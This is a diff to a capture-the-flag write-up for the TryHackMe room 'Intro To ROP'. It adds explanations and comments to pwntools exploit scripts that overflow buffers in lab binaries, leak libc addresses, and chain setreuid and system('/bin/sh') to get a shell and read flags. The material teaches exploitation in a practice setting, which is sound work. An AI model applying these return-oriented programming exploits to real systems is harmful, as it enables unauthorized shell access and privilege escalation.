@@ -1,4 +1,5 @@
 # Intro To ROP
+This room is created by [DiZma](https://tryhackme.com/p/DiZma) and is an introduction to `rop` or `return oriented programming` wherein one uses a series of returns to different functions to do, among other things, access priviledge-enclosed files, `flag.txt`, or certain functions. 
 
 ## Task 3 - First ROP
 We inspect the files that are in the `~\first_rop` directory. Running a `checksec` on `three_locks` gives us a pretty vulnerable binary.
@@ -166,7 +167,9 @@ Here is you flag (hopefully):
 flag{Thr33_Tw0_D0N3}
 ```
 ## Task 5 - libc
+In this task, we are not given a `win()` function but rather the buffer overflow vulnerability itself. We need to find another way to be able to run `cat flag.txt` in this directory. The permissions are set for this file by the same user `leaked_lib` binary runs on when executed. By gaining a `shell` on this binary, we can access the flag. A way to spawn a shell is using in-built commands present in the binary; those commands lie in `libc`. In particular, `/bin/sh` is of particular interest. 
 
+We are given a source code, `leaked_lib.c`, with contents:
 ```C
 #include <dlfcn.h>
 #include <unistd.h>
@@ -194,7 +197,9 @@ int main()
   return 0;
 }
 ```
+We see that the address of `printf` is leaked by the `leaky()` function. Jumping into this function can give us `printf`s address which is helpful in determining `libc`s address. Running `p leaky` in `gdb` gives us the address `0x80485b9`. Great! Now, we need to know what `libc` path is used in the binary so that we can use this using `pwntools`. Running `info proc map` gives us the path `/lib/i386-linux-gnu/libc-2.27.so`. 
 
+We now have all we need to create our payload:
 
 ```python
 from pwn import *
@@ -210,25 +215,21 @@ start = 0x8048566
 #rop exploit
 payload = cyclic(cyclic_find('laaa'))
 payload += p32(leaky)
-payload += p32(start)
+payload += p32(start) # go back to the start to continue returning
 
 p.sendline(payload)
 
 recv_data = p.recvuntil("leak!")
-printf_addr = recv_data[44:54]
+printf_addr = recv_data[44:54] # extract ONLY the leaked printf_address from the printed result of leaky()
 
-libc = ELF("/lib/i386-linux-gnu/libc-2.27.so")
+libc = ELF("/lib/i386-linux-gnu/libc-2.27.so") 
 printf_offset = libc.sym.printf
-
 libc_base = int(printf_addr, 16) - printf_offset
-print("address of libc:", hex(libc_base))
+libc.address = libc_base # find the location of libc
 
-libc.address = libc_base
-print("location of system:", hex(libc.sym.system))
-
-bin_sh = next(libc.search(b'/bin/sh'))
-rop = ROP(libc)
-rop.setreuid(1005, 1005)
+bin_sh = next(libc.search(b'/bin/sh')) # find the command to spawn the shell in libc
+rop = ROP(libc) # create our ROP chain
+rop.setreuid(1005, 1005) # ensure that the wanted user is the real user and effective user when we spawn the shell
 rop.system(bin_sh)
 rop.exit(0)
 
@@ -238,6 +239,7 @@ p.sendline(payload2)
 
 p.interactive()
 ```
+Using the exploit above, we are able to `pwn` the machine and get the flag!
 
 ```console
 buzz@intro2rop:~/leaked_lib$ python2 exploit.py
@@ -263,27 +265,9 @@ flag{l34k_2_pwn}
 
 ## Task 6 - final ret2libc
 
-```C
-#include <unistd.h>
-#include <stdlib.h>
-#include <stdio.h>
-#include <string.h>
+Unlike the previous task, this task had no leaky function with almost the same sourc code which necessitates another way to determine `libc`s address. `PLT`, procedure linkage table, and `GOT`, global offset table, are those ways. By typing `plt` and `got` in gdb for the `final` library, we obtain the addresses for the `puts` function: `0x400460` and `0x601018`.
 
-void start() {
-  printf("Use me to read flag.txt!\n");
-
-  char buf[32];
-  memset(buf, 0, sizeof(buf));
-  read(0, buf, 256);
-}
-
-int main()
-{
-  start();
-
-  return 0;
-}
-```
+The exploit becomes:
 
 ```console
 buzz@intro2rop:~/final$ ropper -f final --search "pop rdi"
@@ -318,7 +302,7 @@ p = process("./final")
 
 #ROP exploit
 payload  = cyclic(cyclic_find('kaaa'))
-payload += rop.chain()
+payload += rop.chain() 
 payload += p64(start)
 
 p.sendline(payload)
